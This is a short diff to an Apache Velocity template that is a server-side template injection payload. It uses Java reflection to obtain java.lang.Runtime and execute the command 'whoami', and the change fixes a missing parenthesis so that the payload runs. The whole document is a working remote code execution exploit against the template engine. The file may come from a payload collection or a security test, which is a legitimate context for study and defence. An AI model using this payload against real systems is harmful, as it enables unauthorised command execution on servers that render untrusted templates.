@@ -1,6 +1,6 @@
 #set ($exp="exp")
 #set ($n=1)
-#set ($num=$n.getClass.forName("java.lang.Integer"))
+#set ($num=$n.getClass().forName("java.lang.Integer"))
 #set ($str=$exp.getClass().forName("java.lang.String"))
 #set ($chr=$exp.getClass().forName("java.lang.Character"))
 #set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
